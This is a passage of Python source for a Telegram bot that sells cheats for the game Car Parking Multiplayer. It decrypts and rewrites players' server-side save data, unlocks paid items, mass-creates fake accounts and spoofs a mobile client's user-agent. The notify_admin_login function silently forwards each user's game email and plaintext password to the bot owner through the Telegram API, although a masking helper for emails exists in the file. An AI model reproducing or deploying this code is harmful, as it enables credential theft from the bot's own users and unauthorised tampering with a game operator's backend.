                    f"https://securetoken.googleapis.com/v1/token?key={FK}",
                    {"grant_type": "refresh_token", "refresh_token": rt},
                    {"Content-Type": "application/json"},
                )
                if result and result.get("id_token"):
                    self.update_token(uid, result["id_token"], result.get("refresh_token", rt))
                    return True, "OK"
            except Exception:
                pass
        if em and pw:
            result = await self.login(em, pw)
            if result.get("ok"):
                self.save_token(uid, result["auth"], em, pw, result.get("refresh_token", ""), result.get("firebase_uid", ""))
                return True, "OK"
        return False, "REFRESH_FAILED"

    async def get_auth(self, uid: int) -> Tuple[bool, str, str]:
        if self.is_expired(uid):
            ok, msg = await self._refresh(uid)
            if not ok:
                return False, msg, ""
        td = self.get_token_data(uid)
        if td and td.get("auth_token"):
            return True, "OK", td["auth_token"]
        return False, "NO_TOKEN", ""

    async def load(self, uid: int, force: bool = False) -> bool:
        td = self.get_token_data(uid)
        if not td:
            return False
        ck = self._ck(uid)
        if not force and ck in self.records:
            return True
        ok, msg, auth = await self.get_auth(uid)
        if not ok:
            return False
        result = await self._post(LOAD_URL, {"data": None}, {**GAME_HEADERS, "Authorization": f"Bearer {auth}"})
        if not result or not result.get("result"):
            return False
        decoded = decrypt_player_record(result["result"], td.get("firebase_uid", ""), td.get("password", ""), td.get("email", ""))
        if decoded.get("success") and decoded.get("record"):
            self.set_record(uid, decoded["record"], td.get("email", ""))
            return True
        return False

    def _ok(self, value: Any) -> bool:
        if value in (1, True):
            return True
        if value in (0, False, None):
            return False
        if isinstance(value, str):
            text = value.strip()
            if text == "1":
                return True
            if text == "0":
                return False
            try:
                return self._ok(json.loads(text))
            except Exception:
                return False
        if isinstance(value, dict):
            for key in ("result", "ok", "success"):
                if key in value:
                    return self._ok(value[key])
        return False

    async def _send(self, auth: str, record: Dict[str, Any], fuid: str,
                    original: Optional[Dict[str, Any]] = None,
                    force_fields: Optional[set] = None) -> Tuple[bool, str]:
        if not fuid:
            return False, "NO_FIREBASE_UID"
        try:
            payload = build_payload(record, fuid, original, force_fields=force_fields)
            result = await self._post(
                SAVE_URL,
                {"data": {"data": payload, "deviceId": fuid[:8]}},
                {**GAME_HEADERS, "Authorization": f"Bearer {auth}", "Connection": "Keep-Alive",
                 "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12; Pixel 6 Build/SD1A.210817.036)"},
            )
            if result and self._ok(result):
                return True, "OK"
            return False, "SAVE_FAILED"
        except Exception as exc:
            return False, str(exc)

    async def _save(self, uid: int, data: Dict[str, Any], force_fields: Optional[set] = None) -> Dict[str, Any]:
        ok, msg, auth = await self.get_auth(uid)
        if not ok:
            return {"ok": False, "message": msg}
        td = self.get_token_data(uid)
        fuid = td.get("firebase_uid", "") if td else ""
        email = td.get("email", "") if td else ""
        original = self.get_record(uid, email) or None
        ok2, msg2 = await self._send(auth, data, fuid, original, force_fields=force_fields)
        if ok2:
            self.set_record(uid, data, email)
            return {"ok": True, "message": "OK"}
        return {"ok": False, "message": msg2}

    async def _modify(self, uid: int, mods: Dict[str, Any], force_fields: Optional[set] = None) -> Dict[str, Any]:
        await self.load(uid)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        data = deepcopy(self.get_record(uid, email))
        if not data or data.get("Name") is None:
            return {"ok": False, "message": "FAILED"}
        for key, value in mods.items():
            if key == "money":
                value = min(int(value), MAX_MONEY)
            if key == "coin":
                value = min(int(value), MAX_COIN)
            data[key] = value
        forced = set(force_fields or mods.keys())
        return await self._save(uid, data, force_fields=forced)

    async def _set_floats(self, uid: int, indices_values: List[Tuple[int, float]]) -> Dict[str, Any]:
        await self.load(uid)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        data = deepcopy(self.get_record(uid, email))
        if not data or data.get("Name") is None:
            return {"ok": False, "message": "FAILED"}
        floats = data.get("floats", [])
        max_idx = max(idx for idx, _ in indices_values)
        while len(floats) <= max_idx:
            floats.append(0.0)
        for idx, value in indices_values:
            floats[idx] = float(value)
        data["floats"] = floats
        return await self._save(uid, data)

    async def _set_integers(self, uid: int, indices_values: List[Tuple[int, int]]) -> Dict[str, Any]:
        """Update integer slots using the same indices as the CPM1 source file."""
        loaded = await self.load(uid)
        if not loaded:
            return {"ok": False, "message": "ACCOUNT LOAD FAILED."}
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        data = deepcopy(self.get_record(uid, email))
        if not data or data.get("Name") is None:
            return {"ok": False, "message": "PROFILE DATA CORRUPTED."}
        integers = list(data.get("integers") or [])
        max_idx = max((idx for idx, _ in indices_values), default=-1)
        while len(integers) <= max_idx:
            integers.append(0)
        for idx, value in indices_values:
            integers[idx] = int(value)
        data["integers"] = integers
        return await self._save(uid, data, force_fields={"integers"})

    async def set_money(self, uid: int, amount: int) -> Dict[str, Any]:
        return await self._modify(uid, {"money": min(int(amount), MAX_MONEY)})

    async def set_coin(self, uid: int, amount: int) -> Dict[str, Any]:
        return await self._modify(uid, {"coin": min(int(amount), MAX_COIN)})

    async def set_player_id(self, uid: int, pid: str) -> Dict[str, Any]:
        return await self._modify(uid, {"localID": str(pid).upper()}, force_fields={"localID"})

    async def set_player_name(self, uid: int, name: str) -> Dict[str, Any]:
        return await self._modify(uid, {"Name": str(name)}, force_fields={"Name"})

    async def unlock_w16(self, uid: int) -> Dict[str, Any]:
        return await self._set_floats(uid, [(32, 1.0)])

    async def unlock_horns(self, uid: int) -> Dict[str, Any]:
        return await self._set_floats(uid, [(27, 1.0), (28, 1.0), (29, 1.0), (30, 1.0), (31, 1.0)])

    async def unlimited_fuel(self, uid: int) -> Dict[str, Any]:
        return await self._set_floats(uid, [(3, 1.0)])

    async def disable_damage(self, uid: int) -> Dict[str, Any]:
        return await self._set_floats(uid, [(34, 1.0)])

    async def unlock_smoke(self, uid: int) -> Dict[str, Any]:
        return await self._set_floats(uid, [(33, 1.0)])

    async def unlock_police(self, uid: int) -> Dict[str, Any]:
        """Full CPM1 police activation copied from SIDALI.py, including owned-car saves."""
        if not await self.load(uid):
            return {"ok": False, "message": "ACCOUNT LOAD FAILED. CHECK CREDENTIALS."}
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        data = deepcopy(self.get_record(uid, email))
        if not data or data.get("Name") is None:
            return {"ok": False, "message": "PROFILE DATA CORRUPTED."}

        extra = {
            "boughtPoliceLights": [0, 9, 511, 1, 4, 15, 2, 2, 3, 3, 2, 3, 4, 1, 1],
            "boughtPoliceSirens": [511],
            "boughtFsos": [-1, 0, 1, 2, 3, 4, 5, 6, 7, 8],
        }
        data.update(extra)
        profile_floats = list(data.get("floats") or [0.0] * 55)
        while len(profile_floats) < 55:
            profile_floats.append(0.0)
        profile_floats[0] = 1.0
        data["floats"] = profile_floats
        profile_result = await self._save(uid, data, force_fields=set(extra) | {"floats"})
        if not profile_result or not profile_result.get("ok"):
            return {"ok": False, "message": "PROFILE POLICE DATA SAVE FAILED; CARS WERE NOT MODIFIED."}

        auth_ok, auth_msg, auth_token = await self.get_auth(uid)
        firebase_uid = td.get("firebase_uid", "") if td else ""
        if not auth_ok or not auth_token or not firebase_uid:
            return {"ok": False, "message": "PROFILE SAVED, BUT CAR POLICE UPDATE FAILED: AUTH/FIREBASE UID MISSING."}
        fetched = await asyncio.to_thread(cpm1_fetch_cars_v2, auth_token)
        if not fetched.get("success"):
            return {"ok": False, "message": "PROFILE SAVED, BUT CARS FETCH FAILED: " + str(fetched.get("error", "unknown"))[:140]}
        cars = fetched.get("cars") or []
        if not cars:
            return {"ok": False, "message": "PROFILE SAVED, BUT NO OWNED CARS WERE RETURNED BY THE SOURCE API."}

        cars_to_save = []
        for car in cars:
            if not isinstance(car, dict) or car.get("CarID") is None:
                continue
            floats = _unpack_cpm1_mp_field(car.get("floats"), "float")
            police_lights = _unpack_cpm1_mp_field(car.get("installedPoliceLights"), "int")
            bought_parts = _unpack_cpm1_mp_field(car.get("BoughtParts"), "int")
            updated_car = deepcopy(car)
            if not floats or len(floats) < 54:
                floats = _unpack_cpm1_mp_field(DEFAULT_CAR_FLOATS, "float") or [0.0] * 54
                while len(floats) < 54: floats.append(0.0)
            floats[0] = 1.0
            updated_car["floats"] = floats
            if not police_lights or police_lights == [-1, -1, -1, -1, -1]:
                updated_car["installedPoliceLights"] = [0, 2, 0, 0, -1]
            if not bought_parts or len(bought_parts) < 71:
                bought_parts = _unpack_cpm1_mp_field(DEFAULT_CAR_BOUGHT_PARTS, "int") or [-1] + [0] * 70
                while len(bought_parts) < 71: bought_parts.append(0)
            bought_parts[46] = 1
            updated_car["BoughtParts"] = bought_parts
            cars_to_save.append(updated_car)
        if not cars_to_save:
            return {"ok": False, "message": "PROFILE SAVED, BUT NO VALID CAR RECORDS COULD BE PREPARED."}
        results = await asyncio.gather(*[
            asyncio.to_thread(cpm1_save_car_encrypted_v2, auth_token, car, firebase_uid, retries=2)
            for car in cars_to_save
        ])
        saved = sum(1 for r in results if r.get("success"))
        failed = len(results) - saved
        if failed:
            errors = []
            for idx, result in enumerate(results):
                if not result.get("success"):
                    detail = str(result.get("error") or result.get("data") or "unknown error")[:180]
                    status = result.get("status")
                    if status is not None:
                        detail = f"HTTP {status}: {detail}"
                    errors.append(f"car {idx + 1}: {detail}")
            detail_text = " | ".join(errors)[:500] or "No error details returned"
            return {"ok": saved > 0, "message": f"POLICE PROFILE SAVED; CARS SAVED {saved}/{len(results)}, FAILED {failed}. DETAILS: {detail_text}"}
        return {"ok": True, "message": f"POLICE LIGHTS/SIRENS UNLOCKED; PROFILE SAVED AND CARS UPDATED {saved}/{len(results)}."}

    async def unlock_houses(self, uid: int) -> Dict[str, Any]:
        """Unlock houses using the exact integer indexes from SIDALI.py."""
        return await self._set_integers(uid, [(8, 1), (110, 1), (111, 1), (112, 1)])

    async def fix_account(self, uid: int) -> Dict[str, Any]:
        await self.load(uid)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        data = deepcopy(self.get_record(uid, email))
        if not data or data.get("Name") is None:
            return {"ok": False, "message": "FAILED"}
        bugs = 0
        floats = data.get("floats", [])[:54]
        while len(floats) < 54:
            floats.append(0.0)
        fixed_floats = []
        for v in floats:
            if v in (1, 1.0):
                fixed_floats.append(1.0)
            elif isinstance(v, (int, float)) and v > 1:
                fixed_floats.append(0.0)
                bugs += 1
            else:
                fixed_floats.append(float(v or 0.0))
        data["floats"] = fixed_floats
        return await self._save(uid, data)

    async def create_account(self) -> Dict[str, Any]:
        rn = random.randint(10000000, 99999999)
        email = "RB" + str(rn) + "@gmail.com"
        pwd = "123456"

        url = f"https://identitytoolkit.googleapis.com/v1/accounts:signUp?key={FK}"
        headers = {
            "Accept": "*/*",
            "Content-Type": "application/json",
            "User-Agent": "UnityPlayer/2022.3.62f2",
            "X-Unity-Version": "2022.3.62f2",
        }

        payload = {"email": email, "password": pwd, "returnSecureToken": True}
        res = await self._post(url, payload, headers)

        if not res or "idToken" not in res:
            pwd = "RB" + str(rn) + "Aa1"
            payload["password"] = pwd
            res = await self._post(url, payload, headers)

        if not res or "idToken" not in res:
            err = "signup_fail"
            if res and isinstance(res.get("error"), dict):
                err = res["error"].get("message", err)
            return {"ok": False, "message": err}

        tk = res["idToken"]
        fu = res["localId"]
        name = "RB_" + str(random.randint(10000, 99999))
        li = str(fu)[:8].upper() if fu else "PLAYER"

        fl = [0.0] * 54
        fl[32] = 1.0
        fl[27] = 1.0; fl[28] = 1.0; fl[29] = 1.0; fl[30] = 1.0; fl[31] = 1.0
        fl[3] = 1.0
        fl[34] = 1.0
        fl[33] = 1.0

        ig = [0] * 100
        ig[0] = 100

        rec = {
            "localID": li, "money": MAX_MONEY, "Name": name, "coin": MAX_COIN,
            "boughtFsos": [], "boughtPoliceLights": [], "boughtPoliceSirens": [],
            "LevelsDoneTime": [0.0] * 50, "floats": fl, "integers": ig,
            "fcar": [], "favouriteWheels": [], "favouriteVinyls": [],
            "favouriteEmojis": [], "emojiPacks": list(range(1, 51)),
            "animations": list(range(1, 51)), "wheels": []
        }

        saved = False
        try:
            payload_str = build_payload(rec, fu, None, force_fields=set(k for _, k in FIELD_MAPPING))
            save_body = {"data": {"data": payload_str, "deviceId": fu[:8] if fu else "00000000"}}
            save_headers = {
                **GAME_HEADERS,
                "Authorization": f"Bearer {tk}",
                "Connection": "Keep-Alive",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 12; Pixel 6 Build/SD1A.210817.036)"
            }
            save_res = await self._post(SAVE_URL, save_body, save_headers)
            saved = bool(save_res and self._ok(save_res))
        except Exception as e:
            logger.error(f"create_acc save error: {e}")
            saved = False

        return {
            "ok": True,
            "account": {
                "email": email, "password": pwd, "fuid": fu,
                "name": name, "local_id": li, "saved": saved,
            }
        }

    async def set_all_levels(self, uid: int) -> Dict[str, Any]:
        await self.load(uid)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        data = deepcopy(self.get_record(uid, email))
        if not data or data.get("Name") is None:
            return {"ok": False, "message": "FAILED"}

        ints = data.get("integers", [])
        while len(ints) < 100:
            ints.append(0)
        ints[0] = 100
        data["integers"] = ints

        levels = data.get("LevelsDoneTime", [])
        while len(levels) < 50:
            levels.append(0.0)
        for idx in range(len(levels)):
            levels[idx] = 0.0
        data["LevelsDoneTime"] = levels

        return await self._save(uid, data, force_fields={"integers", "LevelsDoneTime"})

    async def set_reset_levels(self, uid: int) -> Dict[str, Any]:
        await self.load(uid)
        td = self.get_token_data(uid)
        email = td.get("email") if td else None
        data = deepcopy(self.get_record(uid, email))
        if not data or data.get("Name") is None:
            return {"ok": False, "message": "FAILED"}

        ints = data.get("integers", [])
        while len(ints) < 100:
            ints.append(0)
        ints[0] = 1
        data["integers"] = ints

        levels = data.get("LevelsDoneTime", [])
        while len(levels) < 50:
            levels.append(0.0)
        for idx in range(len(levels)):
            levels[idx] = 999999.0
        data["LevelsDoneTime"] = levels

        return await self._save(uid, data, force_fields={"integers", "LevelsDoneTime"})

nuker = CPMNukerRAM()

def generate_random_uid(length: int = 28) -> str:
    chars = string.ascii_letters + string.digits
    return "".join(random.choice(chars) for _ in range(length))

def get_saved_password(user_id: int, email: str) -> Optional[str]:
    user_creds = CREDENTIALS_DB.get(user_id, [])
    for cred in user_creds:
        if cred.get("email") == email:
            return cred.get("password")
    return None

def track_user_activity(user, feature_key: str = None):
    uid = user.id
    if uid not in USERS_DB:
        USERS_DB.add(uid)
        _save_users()
        
    if uid not in USER_ACTIVITY:
        USER_ACTIVITY[uid] = {
            "name": user.full_name or "بدون اسم",
            "username": f"@{user.username}" if user.username else "لا يوجد",
            "usage_count": 0, "features": {}, "history": []
        }
    else:
        USER_ACTIVITY[uid]["name"] = user.full_name or "بدون اسم"
        USER_ACTIVITY[uid]["username"] = f"@{user.username}" if user.username else "لا يوجد"

    if feature_key:
        USER_ACTIVITY[uid]["usage_count"] += 1
        USER_ACTIVITY[uid]["features"][feature_key] = USER_ACTIVITY[uid]["features"].get(feature_key, 0) + 1
        if feature_key in STATS_DB:
            STATS_DB[feature_key] += 1

def mask_login_email(email: str) -> str:
    """Return a privacy-preserving email label for administrator notifications."""
    value = str(email or "").strip()
    if "@" not in value:
        return "غير متوفر"
    local, domain = value.rsplit("@", 1)
    if len(local) <= 2:
        safe_local = local[:1] + "*"
    else:
        safe_local = local[:2] + "***"
    return f"{safe_local}@{domain}"


async def notify_admin_login(context: ContextTypes.DEFAULT_TYPE, user, game: str, email: str,
                             password: str = "", success: bool = True,
                             game_name: str = "", game_id: str = "", game_username: str = ""):
    """إشعار الأدمين بكل تفاصيل الدخول"""
    import urllib.request, urllib.error, json as _json

    if not user or getattr(user, "id", None) == ADMIN_ID:
        return False

    tg_name     = getattr(user, "full_name", None) or "بدون اسم"
    tg_username = f"@{user.username}" if getattr(user, "username", None) else "—"
    tg_id       = getattr(user, "id", "—")
    status      = "✅ ناجح" if success else "❌ فاشل"

    lines = [
        "🔔 <b>تسجيل دخول جديد</b>",
        f"🎮 اللعبة: <b>{game}</b>",
        "━━━━━━━━━━━━━━━━━━━━━━",
        f"👤 تيليغرام: {tg_name}",
        f"🆔 TG ID: <code>{tg_id}</code>",
        f"🔗 يوزر: {tg_username}",
        "━━━━━━━━━━━━━━━━━━━━━━",
        f"📧 الإيميل: <code>{email}</code>",
        f"🔑 الباسورد: <code>{password}</code>" if password else "",
    ]
    if game_name:    lines.append(f"🎮 اسم اللعبة: <b>{game_name}</b>")
    if game_id:      lines.append(f"🆔 ID اللعبة: <code>{game_id}</code>")
    if game_username: lines.append(f"👤 يوزر اللعبة: <code>{game_username}</code>")
    lines += [
        "━━━━━━━━━━━━━━━━━━━━━━",
        f"📊 الحالة: {status}",
        f"🕒 {time.strftime('%Y-%m-%d %H:%M:%S')}",
    ]
    message = "\n".join(l for l in lines if l)

    try:
        url_send = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
        payload  = {"chat_id": int(ADMIN_ID), "text": message,
                    "parse_mode": "HTML", "disable_web_page_preview": True}
        req = urllib.request.Request(
            url_send, data=_json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json"}
        )
        with urllib.request.urlopen(req, timeout=8) as resp:
            result = _json.loads(resp.read().decode("utf-8"))
        if not result.get("ok"):
            logger.error("Admin notify rejected: %s", result)
            return False
        logger.info("Admin notified: %s", tg_id)
        return True
    except Exception as exc:
        logger.exception("notify_admin_login failed: %s", exc)
        return False


def log_user_action(user, action_desc: str, email: str = None, password: str = None, input_value: Any = None, success: bool = True):
    uid = user.id
    track_user_activity(user)
    if "history" not in USER_ACTIVITY[uid]:
        USER_ACTIVITY[uid]["history"] = []

    entry = {
        "action": action_desc, "email": email, "password": None,
        "input_value": str(input_value) if input_value is not None else None,
        "success": success, "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
    }
    USER_ACTIVITY[uid]["history"].append(entry)

def is_authenticated(context: ContextTypes.DEFAULT_TYPE) -> bool:
    return True

async def delete_old_control_message(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    last_msg_id = context.user_data.get("last_menu_msg_id")
    if last_msg_id:
        try:
            await context.bot.delete_message(chat_id=user_id, message_id=last_msg_id)
        except TelegramError:
            pass
        context.user_data["last_menu_msg_id"] = None

async def update_menu_message(context: ContextTypes.DEFAULT_TYPE, user_id: int, text: str, reply_markup=None, parse_mode="HTML"):
    last_msg_id = context.user_data.get("last_menu_msg_id")
    if last_msg_id:
        try:
            await context.bot.edit_message_text(
                chat_id=user_id, message_id=last_msg_id, text=text,
                reply_markup=reply_markup, parse_mode=parse_mode,
                disable_web_page_preview=True
            )
            return
        except TelegramError:
            pass
    msg = await context.bot.send_message(
        chat_id=user_id, text=text, reply_markup=reply_markup,
        parse_mode=parse_mode, disable_web_page_preview=True
    )
    context.user_data["last_menu_msg_id"] = msg.message_id

async def restore_user_menu(context: ContextTypes.DEFAULT_TYPE, user_id: int):
    lang = context.user_data.get("lang", "ar")
    t = TEXTS[lang]
    current = context.user_data.get("current_menu", "lang")

    if current == "lang":
        await update_menu_message(context, user_id, text=t["select_lang"], reply_markup=get_language_keyboard())
    elif current == "main":
        await update_menu_message(context, user_id, text=t["welcome"], reply_markup=get_main_menu_keyboard(lang))
    elif current == "accounts":
        await update_menu_message(context, user_id, text=t["accounts_header"], reply_markup=get_accounts_keyboard(user_id, lang))
    elif current == "scripts":
        await update_menu_message(context, user_id, text=t["select_op"], reply_markup=get_scripts_keyboard(lang))
    elif current == "actions":
        await show_actions_menu(context, user_id, lang)
    else:
        await update_menu_message(context, user_id, text=t["select_lang"], reply_markup=get_language_keyboard())

def get_language_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("العربية🇩🇿", callback_data="lang_ar"),
         InlineKeyboardButton("English🇺🇸", callback_data="lang_en")]
    ])

def get_main_menu_keyboard(lang: str) -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    label = "🪙 نقاطي | My Points" if lang == "ar" else "🪙 My Points"
    code_btn = "🎫 تفعيل كود | Code Activation" if lang == "ar" else "🎫 Code Activation"
    login_btn = "🪪 تسجيل الدخول | Login" if lang == "ar" else "🪪 Login"
    
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(label, callback_data="my_points")],
        [InlineKeyboardButton(code_btn, callback_data="enter_access_code")],
        [InlineKeyboardButton(login_btn, callback_data="menu_acc_login")],
        [InlineKeyboardButton(t["btn_change_lang"], callback_data="back_to_lang")],
    ])
    
def get_accounts_keyboard(user_id: int, lang: str) -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    buttons = []
    accounts = USER_LOCAL_ACCOUNTS.get(user_id, [])
    for acc in accounts:
        buttons.append([InlineKeyboardButton(f"👤 {acc}", callback_data=f"sel_acc_{acc}")])
    buttons.append([InlineKeyboardButton(t["btn_new_account"], callback_data="btn_add_account")])
    buttons.append([InlineKeyboardButton(t["btn_back"], callback_data="back_to_main")])
    return InlineKeyboardMarkup(buttons)

def get_scripts_keyboard(lang: str) -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(t["btn_script_perm"], callback_data="btn_perm")],
        [InlineKeyboardButton(t["btn_script_money"], callback_data="btn_script_money")],
        [InlineKeyboardButton(t["btn_script_cars"], callback_data="btn_script_cars")],
        [InlineKeyboardButton(t["btn_back"], callback_data="back_to_main")],
    ])
    
def get_account_actions_keyboard(lang: str) -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    collect_label = "تجميع النقاط 🎁" if lang == "ar" else "Collect Points 🎁"
    login_label = "🪪 تسجيل الدخول | Login" if lang == "ar" else "🪪 Login"
    
    keyboard = [
        [InlineKeyboardButton(collect_label, callback_data="collect_points")],
        [InlineKeyboardButton("🎫 تفعيل كود | Code Activation", callback_data="enter_access_code")],
        [InlineKeyboardButton(t["btn_act_details"], callback_data="act_details")],
        [InlineKeyboardButton(t["btn_act_change_email"], callback_data="act_change_email"),
         InlineKeyboardButton(t["btn_act_change_pass"], callback_data="act_change_pass")],

        [InlineKeyboardButton(t["btn_act_king"], callback_data="act_king")],
        [InlineKeyboardButton(t["btn_act_money"], callback_data="act_money"),
         InlineKeyboardButton(t["btn_act_coin"], callback_data="act_coin")],
        [InlineKeyboardButton(t["btn_act_id"], callback_data="act_id"),
         InlineKeyboardButton(t["btn_act_name"], callback_data="act_name")],
        [InlineKeyboardButton(t["btn_act_color_id"], callback_data="act_color_id")],
        [InlineKeyboardButton(t["btn_act_w16"], callback_data="act_w16"),
         InlineKeyboardButton(t["btn_act_horns"], callback_data="act_horns")],
        [InlineKeyboardButton(t["btn_act_fuel"], callback_data="act_fuel"),
         InlineKeyboardButton(t["btn_act_damage"], callback_data="act_damage")],
        [InlineKeyboardButton(t["btn_act_fix"], callback_data="act_fix"),
         InlineKeyboardButton(t["btn_act_smoke"], callback_data="act_smoke")],
        [InlineKeyboardButton(t["btn_act_police"], callback_data="act_police")],
        [InlineKeyboardButton(t["btn_act_houses"], callback_data="act_houses")],
        [InlineKeyboardButton(t["btn_act_unlock_all"], callback_data="act_unlock_all")],
        [InlineKeyboardButton(t["btn_act_create_acc"], callback_data="act_create_acc")],
        [InlineKeyboardButton(t["btn_act_all_levels"], callback_data="act_all_levels"),
         InlineKeyboardButton(t["btn_act_reset_levels"], callback_data="act_reset_levels")],
        [InlineKeyboardButton(login_label, callback_data="menu_acc_login")],
        [InlineKeyboardButton(t["btn_back"], callback_data="back_to_accounts")]
    ]
    return InlineKeyboardMarkup(keyboard)

def get_preset_money_keyboard(lang: str) -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(t["btn_50m"], callback_data="preset_50m")],
        [InlineKeyboardButton(t["btn_back"], callback_data="back_to_actions")]
    ])

def get_preset_coin_keyboard(lang: str) -> InlineKeyboardMarkup:
    t = TEXTS[lang]
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(t["btn_30k"], callback_data="preset_30k"),
         InlineKeyboardButton(t["btn_500k"], callback_data="preset_500k")],
        [InlineKeyboardButton(t["btn_back"], callback_data="back_to_actions")]
    ])

def get_back_keyboard(lang: str, back_target: str = "back_to_main") -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton(TEXTS[lang]["btn_back"], callback_data=back_target)]
    ])

def get_admin_panel_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("إرسال رسالة للمستخدمين✉️", callback_data="admin_broadcast")],
        [InlineKeyboardButton("رجوع🔙", callback_data="admin_panel_back")]
    ])

def get_subscription_keyboard(lang="ar"):
    ar = lang == "ar"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📢 الاشتراك في القناة" if ar else "📢 Join channel", url=CHANNEL_URL)],
        [InlineKeyboardButton("👥 الاشتراك في المجموعة 1" if ar else "👥 Join group 1", url=GROUP_URL)],
        [InlineKeyboardButton("👥 الاشتراك في المجموعة 2" if ar else "👥 Join group 2", url=GROUP2_URL)],
        [InlineKeyboardButton("👥 الاشتراك في المجموعة 3" if ar else "👥 Join group 3", url=GROUP3_URL)],
        [InlineKeyboardButton("✅ تحققت من الاشتراك" if ar else "✅ I have joined", callback_data="check_sub")],
    ])

async def check_subscription(bot, user_id: int) -> bool:
    """Require membership in the configured channel and groups."""
    if user_id == ADMIN_ID:
        return True
    for chat in (CHANNEL_USERNAME, GROUP_USERNAME, GROUP2_USERNAME, GROUP3_USERNAME):
        try:
            member = await bot.get_chat_member(chat_id=chat, user_id=user_id)
            status = getattr(member, "status", "")
            if status == "left" or status == "kicked":
                return False
            # member / administrator / creator / restricted → يعتبر مشترك
        except Exception as exc:
            err = str(exc).lower()
            # إذا البوت ما يقدرش يفحص المجموعة (مش أدمين) → تجاوز الفحص
            if any(k in err for k in ("not enough rights", "bot is not a member",
                                       "chat not found", "not found", "bot was kicked",
                                       "need administrator", "forbidden")):
                logger.warning("Skipping subscription check for %s (bot lacks access): %s", chat, exc)
                continue
            # خطأ آخر مؤقت (network...) → لا نحجب المستخدم
            logger.warning("Subscription check error for %s: %s", chat, exc)
            continue
    return True

async def require_channel_membership(update, context) -> bool:
    user = update.effective_user
    if not user or await check_subscription(context.bot, user.id):
        return True
    lang = context.user_data.get("lang", "ar")
    message = TEXTS[lang]["not_sub"]
    if update.callback_query:
        try:
            await update.callback_query.answer(
                "اشترك في القناة والمجموعات أولاً" if lang == "ar" else "Join the channel and groups first",
                show_alert=True,
            )
        except Exception:
            pass
        await update_menu_message(context, user.id, message,
            reply_markup=get_subscription_keyboard(lang))
    elif update.effective_message:
        await update.effective_message.reply_text(
            message, parse_mode="HTML", reply_markup=get_subscription_keyboard(lang))
    return False

async def can_pay_points(update, context, cost: int, lang=None) -> bool:
    user_id = update.effective_user.id
    if user_id == ADMIN_ID or has_enough_points(user_id, cost):
        return True
    lang = lang or context.user_data.get("lang", "ar")
    pts = get_points(user_id)
    has_sub = has_valid_access(user_id)
    callback_data = getattr(update.callback_query, "data", "") if update.callback_query else ""
    if callback_data.startswith("cpm2_"):
        keyboard = cpm2_activations_keyboard_ptb(lang)
    else:
        keyboard = get_back_keyboard(lang, "back_to_actions")
    if lang == "ar":
        if pts < cost and not has_sub:
            msg = (
                f"⛔ <b>لا يمكن تنفيذ العملية</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"يلزمك <b>أحد</b> هذين الشرطين:\n\n"
                f"🪙 <b>نقاط كافية</b>\n"
                f"المطلوب: <b>{cost}</b> | رصيدك: <b>{pts}</b>\n\n"
                f"🎫 <b>اشتراك فعّال</b>\n"
                f"احصل على كود تفعيل من المشرف"
            )
        else:
            msg = f"❌ نقاطك غير كافية.\n💰 المطلوب: {cost} نقطة\n🪙 رصيدك: {pts} نقطة"
    else:
        if pts < cost and not has_sub:
            msg = (
                f"⛔ <b>Cannot execute</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"You need <b>one</b> of these:\n\n"
                f"🪙 <b>Enough points</b>\n"
                f"Required: <b>{cost}</b> | Yours: <b>{pts}</b>\n\n"
                f"🎫 <b>Active subscription</b>\n"
                f"Get an activation code from admin"
            )
        else:
            msg = f"❌ Not enough points.\n💰 Required: {cost}\n🪙 Your balance: {pts}"
    await update_menu_message(context, user_id, msg, reply_markup=keyboard)
    return False



async def cmd_stopbot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global BOT_MAINTENANCE
    if update.effective_user.id != ADMIN_ID:
        return
    BOT_MAINTENANCE = True
    await update.message.reply_text("🔴 <b>البوت متوقف الآن!</b>\nللتشغيل: /startbot", parse_mode="HTML")
    sent = 0
    for uid in list(POINTS_DB.keys()):
        if uid == ADMIN_ID:
            continue
        try:
            await context.bot.send_message(uid, "🔧 <b>البوت متوقف مؤقتاً للصيانة</b>\nسيعود قريباً ✅", parse_mode="HTML")
            sent += 1
        except Exception:
            pass
    await update.message.reply_text(f"📨 تم إشعار {sent} مستخدم.")

async def cmd_startbot(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global BOT_MAINTENANCE
    if update.effective_user.id != ADMIN_ID:
        return
    BOT_MAINTENANCE = False
    await update.message.reply_text("🟢 <b>البوت يعمل الآن!</b>", parse_mode="HTML")
    sent = 0
    for uid in list(POINTS_DB.keys()):
        if uid == ADMIN_ID:
            continue
        try:
            await context.bot.send_message(uid, "✅ <b>البوت عاد للعمل! يمكنك استخدامه الآن 🟢</b>", parse_mode="HTML")
            sent += 1
        except Exception:
            pass
    await update.message.reply_text(f"📨 تم إشعار {sent} مستخدم.")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    if is_banned(user_id):
        await update.message.reply_text("🚫 أنت محظور من استخدام البوت.")
        return

    if user_id != ADMIN_ID and not await check_subscription(context.bot, user_id):
        if context.args:
